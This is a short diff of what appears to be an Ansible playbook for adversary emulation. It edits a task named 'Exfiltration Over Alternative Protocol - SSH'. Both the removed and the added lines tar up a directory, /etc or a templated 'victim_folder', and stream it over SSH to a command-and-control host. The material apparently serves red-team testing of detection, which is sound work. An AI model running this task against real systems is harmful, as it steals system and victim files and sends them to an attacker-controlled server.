@@ -6,4 +6,4 @@
   tasks:
           - name: Exfiltration Over Alternative Protocol - SSH
             shell: |
-                ssh {{ cnc_fqdn }} "(cd /etc && tar -zcvf - *) > ./etc.tar.gz"
+                ssh {{ cnc_fqdn }} "(cd {{ victim_folder }} && tar -zcvf - *) > ./{{ victim_file }}tar.gz"
